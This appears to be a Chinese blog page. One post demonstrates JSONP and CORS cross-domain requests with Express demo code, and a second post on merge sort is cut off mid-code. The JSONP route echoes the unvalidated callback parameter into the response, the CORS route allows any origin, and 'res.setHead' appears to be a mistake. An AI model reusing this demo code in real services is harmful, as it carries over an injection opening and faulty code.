<p>&#x8FD9;&#x51E0;&#x5929;&#x770B;&#x4E86;&#x9B3C;&#x9053;&#x5E08;&#x5144;&#x7684; <a href="http://book.douban.com/subject/25909777/" target="_blank" rel="external">&#x300A;&#x8DE8;&#x7EC8;&#x7AEF;Web&#x300B;</a> &#x8FD9;&#x672C;&#x4E66;&#xFF0C;&#x8BE5;&#x4E66;&#x4ECE;&#x89E3;&#x51B3;&#x5B9E;&#x9645;&#x4E1A;&#x52A1;&#x51FA;&#x53D1;&#xFF0C;&#x8BB2;&#x8FF0;&#x4E86;&#x8DE8;&#x7EC8;&#x7AEF;&#x7684;&#x4F18;&#x52BF;&#x4E0E;&#x672A;&#x6765;&#xFF0C;&#x53D7;&#x76CA;&#x826F;&#x591A;&#x3002;&#x5176;&#x4E2D;&#xFF0C;&#x4E66;&#x4E2D;&#x7B2C;&#x4E5D;&#x7AE0;&#x4ECB;&#x7ECD;&#x4E86;&#x4F5C;&#x8005;&#x5728;&#x963F;&#x91CC;&#x5185;&#x90E8;&#x7684;&#x4E00;&#x4E2A;&#x53C2;&#x8D5B;&#x4F5C;&#x54C1; <a href="http://blog.jobbole.com/49881/" target="_blank" rel="external">Storage</a> &#xFF0C;&#x8BE5;&#x4F5C;&#x54C1;&#x5DE7;&#x5999;&#x7684;&#x4F7F;&#x7528;&#x4E86;&#x8DE8;&#x57DF;&#x77E5;&#x8BC6;&#xFF0C;&#x8BA9;&#x6211;&#x89C1;&#x8BC6;&#x5230;&#x8DE8;&#x57DF;&#x5176;&#x5B9E;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F; JSONP &#x3002;&#x4EE5;&#x524D;&#xFF0C;&#x5BF9;&#x524D;&#x7AEF;&#x8DE8;&#x57DF;&#x8FD9;&#x5757;&#x6216;&#x591A;&#x6216;&#x5C11;&#x6709;&#x70B9;&#x4E86;&#x89E3;&#xFF0C;&#x4F46;&#x771F;&#x6B63;&#x52A8;&#x624B;&#x5B9E;&#x8DF5;&#x7684;&#x4E0D;&#x662F;&#x5F88;&#x591A;&#x3002;&#x4E8E;&#x662F;&#xFF0C;&#x8FD9;&#x6BB5;&#x65F6;&#x95F4;&#x6211;&#x597D;&#x597D;&#x6574;&#x7406;&#x4E86;&#x5E38;&#x7528;&#x8DE8;&#x57DF;&#x65B9;&#x6CD5;&#x7684;&#x5177;&#x4F53;&#x5B9E;&#x73B0;&#x3002;&#x672C;&#x6587;&#xFF0C;&#x4E3B;&#x8981;&#x4ECB;&#x7ECD;&#x4E86; JSONP &#x548C; CORS &#x7684;&#x5B9E;&#x73B0;&#x65B9;&#x5F0F;&#x3002; </p>
<h4 id="&#x76F8;&#x5173;&#x6982;&#x5FF5;&#xFF1A;">&#x76F8;&#x5173;&#x6982;&#x5FF5;&#xFF1A;</h4><ul>
<li>&#x53EA;&#x8981;&#x534F;&#x8BAE;&#x3001;&#x57DF;&#x540D;&#x3001;&#x7AEF;&#x53E3;&#x6709;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;&#x4E0D;&#x540C;&#xFF0C;&#x90FD;&#x88AB;&#x5F53;&#x4F5C;&#x662F;&#x4E0D;&#x540C;&#x7684;&#x57DF;</li>
<li>JavaScript&#x51FA;&#x4E8E;&#x5B89;&#x5168;&#x65B9;&#x9762;&#x7684;&#x8003;&#x8651;&#xFF0C;&#x4E0D;&#x5141;&#x8BB8;&#x8DE8;&#x57DF;&#x8C03;&#x7528;&#x5176;&#x4ED6;&#x9875;&#x9762;&#x7684;&#x5BF9;&#x8C61;</li>
<li>&#x8DE8;&#x57DF;&#x7B80;&#x5355;&#x5730;&#x7406;&#x89E3;&#x5C31;&#x662F;&#x56E0;&#x4E3A;JavaScript&#x540C;&#x6E90;&#x7B56;&#x7565;&#x7684;&#x9650;&#x5236;&#xFF0C; a.com &#x57DF;&#x540D;&#x4E0B;&#x7684;js&#x65E0;&#x6CD5;&#x64CD;&#x4F5C; b.com &#x6216;&#x662F; c.a.com &#x57DF;&#x540D;&#x4E0B;&#x7684;&#x5BF9;&#x8C61;</li>
</ul>
<h4 id="&#x6CE8;&#x610F;&#xFF1A;">&#x6CE8;&#x610F;&#xFF1A;</h4><ul>
<li>&#x5982;&#x679C;&#x662F;&#x534F;&#x8BAE;&#x548C;&#x7AEF;&#x53E3;&#x9020;&#x6210;&#x7684;&#x8DE8;&#x57DF;&#x95EE;&#x9898;&#x201C;&#x524D;&#x53F0;&#x201D;&#x662F;&#x65E0;&#x80FD;&#x4E3A;&#x529B;&#x7684;</li>
<li>&#x5728;&#x8DE8;&#x57DF;&#x95EE;&#x9898;&#x4E0A;&#xFF0C;&#x57DF;&#x4EC5;&#x4EC5;&#x662F;&#x901A;&#x8FC7;&#x201C;URL&#x7684;&#x9996;&#x90E8;&#x201D;&#x6765;&#x8BC6;&#x522B;&#x800C;&#x4E0D;&#x4F1A;&#x53BB;&#x5C1D;&#x8BD5;&#x5224;&#x65AD;&#x76F8;&#x540C;&#x7684;ip&#x5730;&#x5740;&#xFFFD;&#xFFFD;&#xFFFD;&#x5E94;&#x7740;&#x4E24;&#x4E2A;&#x57DF;&#x6216;&#x4E24;&#x4E2A;&#x57DF;&#x662F;&#x5426;&#x5728;&#x540C;&#x4E00;&#x4E2A; ip &#x4E0A;&#xFF08;&#x201C;URL&#x7684;&#x9996;&#x90E8;&#x201D;&#x6307; window.location.protocol +window.location.host &#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;&#x201C;Domains, protocols and ports must match&#x201D;&#xFF09;</li>
</ul>
<p>&#x76F8;&#x5173;&#x914D;&#x7F6E;&#xFF1A;&#x4E3A;&#x4E86;&#x6F14;&#x793A;&#x6548;&#x679C;&#xFF0C;&#x5728;hosts&#x6587;&#x4EF6;&#x91CC;&#x9762;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x5185;&#x5BB9; </p>
<pre><code>127<span class="class">.0</span><span class="class">.0</span><span class="class">.1</span> <span class="tag">www</span><span class="class">.myapp</span><span class="class">.com</span>  
127<span class="class">.0</span><span class="class">.0</span><span class="class">.1</span> <span class="tag">sample</span><span class="class">.myapp</span><span class="class">.com</span>  
127<span class="class">.0</span><span class="class">.0</span><span class="class">.1</span> <span class="tag">www</span><span class="class">.otherapp</span><span class="class">.com</span>  
</code></pre><p>&#x6CE8;&#x610F;&#xFF1A;&#x6D4B;&#x8BD5;demo&#x57FA;&#x4E8E; NodeJS &#x7684; Express4.X &#x6846;&#x67B6;&#xFF0C;&#x4E14;&#x7AEF;&#x53E3;&#x8BBE;&#x7F6E;&#x4E3A; 80</p>
<h2 id="JSONP">JSONP</h2><p>JSONP &#x4E5F;&#x53EB;&#x586B;&#x5145;&#x5F0F; JSON &#xFF0C;&#x662F;&#x5E94;&#x7528; JSON &#x7684;&#x4E00;&#x79CD;&#x65B0;&#x65B9;&#x6CD5;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x662F;&#x88AB;&#x5305;&#x542B;&#x5728;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x4E2D;&#x7684; JSON &#xFF08;&#x5982;&#xFF1A; callback({&quot;name&quot;, &quot;chenjun&quot;}); &#xFF09;&#x3002; JSONP &#x7531;&#x4E24;&#x90E8;&#x5206;&#x7EC4;&#x6210;&#xFF1A;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x548C;&#x6570;&#x636E;&#x3002;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x662F;&#x5F53;&#x54CD;&#x5E94;&#x5230;&#x6765;&#x65F6;&#x5E94;&#x8BE5;&#x5728;&#x9875;&#x9762;&#x4E2D;&#x8C03;&#x7528;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x800C;&#x6570;&#x636E;&#x5C31;&#x662F;&#x4F20;&#x5165;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x4E2D;&#x7684; JSON &#x6570;&#x636E; </p>
<p>&#x8DE8;&#x57DF;&#x539F;&#x7406;&#xFF1A;&#x5229;&#x7528; &lt;script&gt; &#x6807;&#x7B7E;&#x6CA1;&#x6709;&#x8DE8;&#x57DF;&#x9650;&#x5236;&#xFF0C;&#x5B9E;&#x73B0;&#x8DE8;&#x57DF;&#x76EE;&#x7684; </p>
<h4 id="&#x8BBF;&#x95EE;&#x9875;&#x9762;&#xFF1A;jsonp_test-ejs">&#x8BBF;&#x95EE;&#x9875;&#x9762;&#xFF1A;jsonp_test.ejs</h4><pre><code><span class="subst">&amp;</span><span class="literal">lt</span>;script<span class="subst">&amp;</span><span class="literal">gt</span>;
  function dosomething(jsondata) {
    alert(jsondata<span class="built_in">.</span>name <span class="subst">+</span> <span class="subst">&amp;</span>quot; <span class="subst">&amp;</span>quot; <span class="subst">+</span> jsondata<span class="built_in">.</span>age);
  }
<span class="subst">&amp;</span><span class="literal">lt</span>;/script<span class="subst">&amp;</span><span class="literal">gt</span>;
<span class="subst">&amp;</span><span class="literal">lt</span>;script src<span class="subst">=&amp;</span>quot;http:<span class="comment">//www.otherapp.com/jsonp_data?callback=dosomething&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;</span>
</code></pre><h4 id="&#x540E;&#x53F0;&#x8DEF;&#x7531;&#xFF1A;index-js">&#x540E;&#x53F0;&#x8DEF;&#x7531;&#xFF1A;index.js</h4><pre><code><span class="comment">/* JSONP Test */</span>
router.get(&amp;apos;/jsonp_test&amp;apos;, <span class="function"><span class="keyword">function</span><span class="params">(req, res)</span> </span>{  
  res.render(&amp;apos;jsonp/jsonp_test&amp;apos;);
});

router.get(&amp;apos;/jsonp_data&amp;apos;, <span class="function"><span class="keyword">function</span><span class="params">(req, res)</span> </span>{  
  <span class="keyword">var</span> <span class="keyword">callback</span> = req.query.<span class="keyword">callback</span>;
  <span class="keyword">var</span> data = { name: &amp;quot;chenjun&amp;quot;, age: &amp;quot;<span class="number">25</span>&amp;quot; };
  <span class="keyword">var</span> str =  <span class="keyword">callback</span> + &amp;apos;(&amp;apos; + JSON.stringify(data) + &amp;apos;)&amp;apos;; <span class="comment">//jsonp</span>
  res.end(str);
});
</code></pre><p>&#x6548;&#x679C;&#xFF1A; </p>
<p><img src="http://taojinke.github.io/img/20150607/cbb2d43.jpg" alt=""></p>
<h4 id="JSONP&#x4F18;&#x7F3A;&#x70B9;&#xFF1A;">JSONP&#x4F18;&#x7F3A;&#x70B9;&#xFF1A;</h4><ul>
<li><strong>&#x4F18;&#x70B9;&#xFF1A;</strong> &#x5B83;&#x4E0D;&#x50CF; XMLHttpRequest &#x5BF9;&#x8C61;&#x5B9E;&#x73B0;&#x7684;Ajax&#x8BF7;&#x6C42;&#x90A3;&#x6837;&#x53D7;&#x5230;&#x540C;&#x6E90;&#x7B56;&#x7565;&#x7684;&#x9650;&#x5236;&#xFF1B;&#x5B83;&#x7684;&#x517C;&#x5BB9;&#x6027;&#x66F4;&#x597D;&#xFF0C;&#x5728;&#x66F4;&#x52A0;&#x53E4;&#x8001;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x90FD;&#x53EF;&#x4EE5;&#x8FD0;&#x884C;&#xFF1B;&#x5E76;&#x4E14;&#x5728;&#x8BF7;&#x6C42;&#x5B8C;&#x6BD5;&#x540E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x7528;callback&#x7684;&#x65B9;&#x5F0F;&#x56DE;&#x4F20;&#x7ED3;&#x679C;</li>
<li><strong>&#x7F3A;&#x70B9;&#xFF1A;</strong> &#x5B83;&#x53EA;&#x652F;&#x6301; GET &#x8BF7;&#x6C42;&#x800C;&#x4E0D;&#x652F;&#x6301; POST &#x7B49;&#x5176;&#x5B83;&#x7C7B;&#x578B;&#x7684;HTTP&#x8BF7;&#x6C42;&#xFF1B;&#x5B83;&#x53EA;&#x652F;&#x6301;&#x8DE8;&#x57DF;HTTP&#x8BF7;&#x6C42;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x4E0D;&#x80FD;&#x89E3;&#x51B3;&#x4E0D;&#x540C;&#x57DF;&#x7684;&#x4E24;&#x4E2A;&#x9875;&#x9762;&#x4E4B;&#x95F4;&#x5982;&#x4F55;&#x8FDB;&#x884C;JS&#x8C03;&#x7528;&#x7684;&#x95EE;&#x9898;</li>
</ul>
<h2 id="CORS">CORS</h2><p>CORS &#xFF08;Cross-Origin Resource Sharing&#xFF09;&#x8DE8;&#x57DF;&#x8D44;&#x6E90;&#x5171;&#x4EAB;&#xFF0C;&#x5B9A;&#x4E49;&#x4E86;&#x5FC5;&#x987B;&#x5728;&#x8BBF;&#x95EE;&#x8DE8;&#x57DF;&#x8D44;&#x6E90;&#x65F6;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x5E94;&#x8BE5;&#x5982;&#x4F55;&#x6C9F;&#x901A;&#x3002; </p>
<p>&#x8DE8;&#x57DF;&#x539F;&#x7406;&#xFF1A; CORS &#x80CC;&#x540E;&#x7684;&#x57FA;&#x672C;&#x601D;&#x60F3;&#x5C31;&#x662F;&#x4F7F;&#x7528;&#x81EA;&#x5B9A;&#x4E49;&#x7684;HTTP&#x5934;&#x90E8;&#x8BA9;&#x6D4F;&#x89C8;&#x5668;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x6C9F;&#x901A;&#xFF0C;&#x4ECE;&#x800C;&#x51B3;&#x5B9A;&#x8BF7;&#x6C42;&#x6216;&#x54CD;&#x5E94;&#x662F;&#x5E94;&#x8BE5;&#x6210;&#x529F;&#x8FD8;&#x662F;&#x5931;&#x8D25; </p>
<h4 id="&#x6D4F;&#x89C8;&#x5668;&#x652F;&#x6301;&#x60C5;&#x51B5;&#xFF1A;">&#x6D4F;&#x89C8;&#x5668;&#x652F;&#x6301;&#x60C5;&#x51B5;&#xFF1A;</h4><ul>
<li>Chrome 3+</li>
<li>Firefox 3.5+</li>
<li>Opera 12+</li>
<li>Safari 4+</li>
<li>Internet Explorer 8+</li>
</ul>
<p>Chrome&#xFF0C;Firefox&#xFF0C;Opera&#x548C;Safari&#x90FD;&#x4F7F;&#x7528; XMLHttpRequest2 &#x5BF9;&#x8C61;&#x3002; Internet Explorer&#x4F7F;&#x7528;&#x4E86;&#x7C7B;&#x4F3C;&#x7684; XDomainRequest &#x5BF9;&#x8C61;&#xFF0C;&#x5176;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#x548C; XMLHttpRequest &#x5927;&#x81F4;&#x76F8;&#x540C;&#xFF0C;&#x4F46;&#x589E;&#x52A0;&#x4E86;&#x989D;&#x5916;&#x7684;&#x5B89;&#x5168;&#x9884;&#x9632;&#x63AA;&#x65BD;&#x3002; </p>
<h4 id="&#x8BBF;&#x95EE;&#x9875;&#x9762;&#xFF1A;cors_test-ejs">&#x8BBF;&#x95EE;&#x9875;&#x9762;&#xFF1A;cors_test.ejs</h4><pre><code>// &amp;<span class="comment">#x521B;&amp;#x5EFA;XHR &amp;#x5BF9;&amp;#x8C61;.</span>
function createCORSRequest(<span class="keyword">method</span>, url) {
  <span class="keyword">var</span> xhr = new <span class="type">XMLHttpRequest</span>();
  <span class="keyword">if</span> (&amp;quot;withCredentials&amp;quot; <span class="keyword">in</span> xhr) {
    // <span class="type">XHR</span> <span class="keyword">for</span> <span class="type">Chrome</span>/<span class="type">Firefox</span>/<span class="type">Opera</span>/<span class="type">Safari</span>.
    xhr.open(<span class="keyword">method</span>, url, <span class="literal">true</span>);
  } <span class="keyword">else</span> <span class="keyword">if</span> (typeof <span class="type">XDomainRequest</span> != &amp;quot;undefined&amp;quot;) {
    // <span class="type">XDomainRequest</span> <span class="keyword">for</span> <span class="type">IE</span>.
    xhr = new <span class="type">XDomainRequest</span>();
    xhr.open(<span class="keyword">method</span>, url);
  } <span class="keyword">else</span> {
    // &amp;<span class="comment">#x4E0D;&amp;#x652F;&amp;#x6301;CORS.</span>
    xhr = null;
  }
  <span class="keyword">return</span> xhr;
}

// &amp;<span class="comment">#x53D1;&amp;#x8D77;CORS&amp;#x8BF7;&amp;#x6C42;</span>
function makeCorsRequest() {
  <span class="keyword">var</span> url = &amp;apos;http://www.otherapp.com/cors_data&amp;apos;;
  <span class="keyword">var</span> xhr = createCORSRequest(&amp;apos;<span class="type">GET</span>&amp;apos;, url);
  <span class="keyword">if</span> (!xhr) {
    alert(&amp;apos;<span class="type">CORS</span> <span class="keyword">not</span> supported!&amp;apos;);
    <span class="keyword">return</span>;
  }

  // &amp;<span class="comment">#x54CD;&amp;#x5E94;&amp;#x5904;&amp;#x7406;</span>
  xhr.onload = function() {
    <span class="keyword">var</span> text = xhr.responseText;
    alert(text);
  }
  xhr.onerror = function() {
    alert(&amp;apos;<span class="type">Woops</span>, there was an error making the request.&amp;apos;);
  }

  xhr.send();
}

makeCorsRequest();
</code></pre><h4 id="&#x540E;&#x53F0;&#x8DEF;&#x7531;&#xFF1A;index-js-1">&#x540E;&#x53F0;&#x8DEF;&#x7531;&#xFF1A;index.js</h4><pre><code>router.get(&amp;apos;/cors_test&amp;apos;, <span class="function"><span class="keyword">function</span><span class="params">(req, res)</span></span> {  
  res.render(&amp;apos;cors/cors_test&amp;apos;);
});

router.get(&amp;apos;/cors_data&amp;apos;, <span class="function"><span class="keyword">function</span><span class="params">(req, res)</span></span> {  
  var <span class="type">data</span> = { <span class="keyword">name</span>: &amp;quot;chenjun&amp;quot;, age: &amp;quot;<span class="number">25</span>&amp;quot; };
  // &amp;#x8BBE;&amp;#x7F6E;&amp;#x54CD;&amp;#x5E94;&amp;#x5934;
  res.setHead(&amp;apos;<span class="keyword">Access</span>-Control-Allow-Origin&amp;apos;, &amp;apos;*&amp;apos;);
  res.<span class="keyword">end</span>(JSON.stringify(<span class="type">data</span>));
});
</code></pre><p>&#x6548;&#x679C;&#xFF1A; </p>
<p><img src="http://taojinke.github.io/img/20150607/cbb2d43.jpg" alt=""></p>
<h4 id="CORS&#x4F18;&#x7F3A;&#x70B9;&#xFF1A;">CORS&#x4F18;&#x7F3A;&#x70B9;&#xFF1A;</h4><ul>
<li><strong>&#x4F18;&#x70B9;&#xFF1A;</strong> &#x652F;&#x6301;&#x6240;&#x6709;&#x7C7B;&#x578B;&#x7684;HTTP&#x8BF7;&#x6C42;&#xFF1B;&#x4F7F;&#x7528;&#x666E;&#x901A;&#x7684;XMLHttpRequest&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#x548C;&#x83B7;&#x5F97;&#x6570;&#x636E;&#xFF0C;&#x62E5;&#x6709;&#x826F;&#x597D;&#x7684;&#x51FA;&#x9519;&#x5904;&#x7406;</li>
<li><strong>&#x7F3A;&#x70B9;&#xFF1A;</strong> &#x8001;&#x5F0F;&#x6D4F;&#x89C8;&#x5668;&#x4E0D;&#x652F;&#x6301;</li>
</ul>
<h2 id="&#x7ED3;&#x8BED;">&#x7ED3;&#x8BED;</h2><p>&#x6D4B;&#x8BD5;&#x6E90;&#x7801;&#x8BF7; <a href="https://github.com/chenjunxyf/NodeDemos" target="_blank" rel="external">&#x6233;&#x8FD9;</a> &#xFF01;&#x4E0B;&#x9762;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x5C06;&#x4ECB;&#x7ECD; document.domain &#x3001; URL.hash &#x3001; cross-fragment &#x3001; window.name &#x548C; postMessage &#x8FD9;&#x4E94;&#x79CD;&#x65B9;&#x5F0F;&#x7684;&#x8DE8;&#x57DF;&#x5B9E;&#x73B0;&#x3002; </p>
<h2 id="&#x53C2;&#x8003;">&#x53C2;&#x8003;</h2><p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/iqQ3Un">6.1.2 &#x5B9A;&#x4E49;&#x591A;&#x4E2A;&#x5C5E;&#x6027;</a></li>
<li>2.<a href="/articles/Mzqyaay">&#x524D;&#x7AEF;&#x5F00;&#x53D1;&#x9762;&#x8BD5;&#x5C0F;&#x7ED3;</a></li>
<li>3.<a href="/articles/MjYZvm3">chrome&#x6269;&#x5C55;&#x5E94;&#x7528;&#x5F00;&#x53D1;&#x6559;&#x7A0B;&#x4E4B;&#x5F00;&#x53D1;chrome&#x5E94;&#x7528;&#x57FA;&#x7840;</a></li>
<li>4.<a href="/articles/FvUfAzE">[Network] HTML&#x3001;XML&#x548C;JSON&#x5B66;&#x4E60;&#x6C47;&#x603B;</a></li>
<li>5.<a href="/articles/I7FrQ3j">ValidationSuar&#x8868;&#x5355;&#x9A8C;&#x8BC1;&#x6846;&#x67B6;-&#x652F;&#x6301;ASP.NET MVC ASP.NET WebFroM</a></li>
<li><p>6.<a href="/articles/NjA3Yzn">JavaScript OOP &#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#x7684;7&#x79CD;&#x65B9;&#x5F0F;</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/bui6Rrq">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;bui6Rrq&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/JSONP/">JSONP</a><a href="/tags/JavaScript/">JavaScript</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/cbb1c2c/" title="《算法导论》读书笔记之排序算法—Merge Sort 归并排序算法 -" itemprop="url">《算法导论》读书笔记之排序算法—Merge Sort 归并排序算法 -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-07T02:16:31.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="&#x300A;&#x7B97;&#x6CD5;&#x5BFC;&#x8BBA;&#x300B;&#x8BFB;&#x4E66;&#x7B14;&#x8BB0;&#x4E4B;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;&#x2014;Merge_Sort_&#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;">&#x300A;&#x7B97;&#x6CD5;&#x5BFC;&#x8BBA;&#x300B;&#x8BFB;&#x4E66;&#x7B14;&#x8BB0;&#x4E4B;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;&#x2014;Merge Sort &#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 14:13:00  <a href="/sites/Fn2umm">&#x535A;&#x5BA2;&#x56ED;-&#x539F;&#x521B;&#x7CBE;&#x534E;&#x533A;</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.cnblogs.com/wushuaiyi/p/4558409.html?utm_source=tuicool" target="_blank" rel="external">http://www.cnblogs.com/wushuaiyi/p/4558409.html</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11010041">&#x5F52;&#x5E76;&#x6392;&#x5E8F;</a></p>
<p>&#x81EA;&#x4ECE;&#x6253;ACM&#x4EE5;&#x6765;&#x4E5F;&#x7B97;&#x662F;&#x7528;&#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x4E86;&#x597D;&#x4E45;&#xFF0C;&#x73B0;&#x5728;&#x5C31;&#x5199;&#x4E00;&#x7BC7;&#x535A;&#x5BA2;&#x6765;&#x4ECB;&#x7ECD;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#x5427; :)</p>
<p><img src="http://taojinke.github.io/img/20150607/cbb0151.png" alt=""></p>
<p>&#x56FE;&#x7247;&#x6765;&#x81EA;&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#xFF0C;&#x663E;&#x793A;&#x4E86;&#x5B8C;&#x6574;&#x7684;&#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x8FC7;&#x7A0B;&#x3002;&#x4F8B;&#x5982;&#x6570;&#x7EC4;{38, 27, 43, 3, 9, 82, 10}.</p>
<p>&#x5728;&#x7B97;&#x6CD5;&#x5BFC;&#x8BBA;&#x8BB2;&#x5206;&#x6CBB;&#x7B97;&#x6CD5;&#x4E00;&#x7AE0;&#x7684;&#x65F6;&#x5019;&#x63D0;&#x5230;&#x4E86;&#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x3002;&#x9996;&#x5148;&#xFF0C;&#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x662F;&#x4E00;&#x4E2A;&#x5206;&#x6CBB;&#x7B97;&#x6CD5;&#x3002;</p>
<p>&#x5F52;&#x5E76;&#xFF08;Merge&#xFF09;&#x6392;&#x5E8F;&#x6CD5;&#x662F;&#x5C06;&#x4E24;&#x4E2A;&#xFF08;&#x6216;&#x4E24;&#x4E2A;&#x4EE5;&#x4E0A;&#xFF09;&#x6709;&#x5E8F;&#x8868;&#x5408;&#x5E76;&#x6210;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x6709;&#x5E8F;&#x8868;&#xFF0C;</p>
<p>&#x5373;&#x628A;&#x5F85;&#x6392;&#x5E8F;&#x5E8F;&#x5217;&#x5206;&#x4E3A;&#x82E5;&#x5E72;&#x4E2A;&#x6709;&#x5E8F;&#x7684;&#x5B50;&#x5E8F;&#x5217;&#xFF0C;&#x518D;&#x628A;&#x6709;&#x5E8F;&#x7684;&#x5B50;&#x5E8F;&#x5217;&#x5408;&#x5E76;&#x4E3A;&#x6574;&#x4F53;&#x6709;&#x5E8F;&#x5E8F;&#x5217;&#x3002;</p>
<p>merg()&#xA0;&#x51FD;&#x6570;&#x662F;&#x7528;&#x6765;&#x5408;&#x5E76;&#x4E24;&#x4E2A;&#x5DF2;&#x6709;&#x5E8F;&#x7684;&#x6570;&#x7EC4;.&#xA0; &#x662F;&#x6574;&#x4E2A;&#x7B97;&#x6CD5;&#x7684;&#x5173;&#x952E;&#x3002; </p>
<p>&#x90A3;&#x4E48;&#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x6709;&#x4EC0;&#x4E48;&#x7528;&#x5904;&#x5462;&#xFF1F;</p>
<ol>
<li>&#x5BF9;&#x6570;&#x7EC4;&#x4E2D;&#x5143;&#x7D20;&#x7ECF;&#x884C;&#x6392;&#x5E8F;</li>
<li>&#x5BF9;&#x94FE;&#x8868;&#x4E2D;&#x5143;&#x7D20;&#x7ECF;&#x884C;&#x6392;&#x5E8F;&#xFF0C;&#x5176;&#x5B83;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;&#x5982;&#x5806;&#x6392;&#x5E8F;&#x548C;&#x5FEB;&#x901F;&#x6392;&#x5E8F;&#x4E0D;&#x80FD;&#x5BF9;&#x94FE;&#x8868;&#x6392;&#x5E8F; &#xFF08;&#x53C2;&#x8003;&#x6211;&#x5199;&#x7684;&#x535A;&#x5BA2;<a href="http://www.cnblogs.com/wushuaiyi/p/4558391.html&amp;#xFF09" target="_blank" rel="external">http://www.cnblogs.com/wushuaiyi/p/4558391.html&amp;#xFF09</a>;</li>
<li>&#x53EF;&#x4EE5;&#x6C42;&#x9006;&#x5E8F;&#x6570; &#xFF08;&#x53C2;&#x8003;&#x6211;&#x5199;&#x7684;&#x535A;&#x5BA2;<a href="http://www.cnblogs.com/wushuaiyi/p/4362149.html&amp;#xFF09" target="_blank" rel="external">http://www.cnblogs.com/wushuaiyi/p/4362149.html&amp;#xFF09</a>;</li>
<li>&#x5916;&#x6392;&#x5E8F;&#xA0;</li>
</ol>
<p>&#x4E0B;&#x9762;&#x662F;&#x6211;&#x5199;&#x7684;&#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x4F7F;&#x7528;C++&#x5B9E;&#x73B0;&#x7684;&#x4E00;&#x4E2A;&#x7248;&#x672C;&#xFF1A;</p>
<pre><code><span class="comment">#include &amp;lt;iostream&amp;gt;</span>
using namespace std;
const <span class="keyword">int</span> MAXN = <span class="number">10900</span>;
<span class="keyword">int</span> a[MAXN], tmp[MAXN], n;
void Merge (<span class="keyword">int</span> l, <span class="keyword">int</span> <span class="keyword">m</span>, <span class="keyword">int</span> r) {
    <span class="keyword">int</span> i = l;
    <span class="keyword">int</span> j = <span class="keyword">m</span> + <span class="number">1</span>;
    <span class="keyword">int</span> k = l;
    <span class="keyword">while</span> (i &amp;<span class="keyword">lt</span>;= <span class="keyword">m</span> &amp;amp;&amp;amp; j &amp;<span class="keyword">lt</span>;= r) {
        <span class="keyword">if</span> (a[i] &amp;<span class="keyword">lt</span>; a[j]) {
            tmp[k++] = a[i++];
        } <span class="keyword">else</span> {
            tmp[k++] = a[j++];
        }
    }
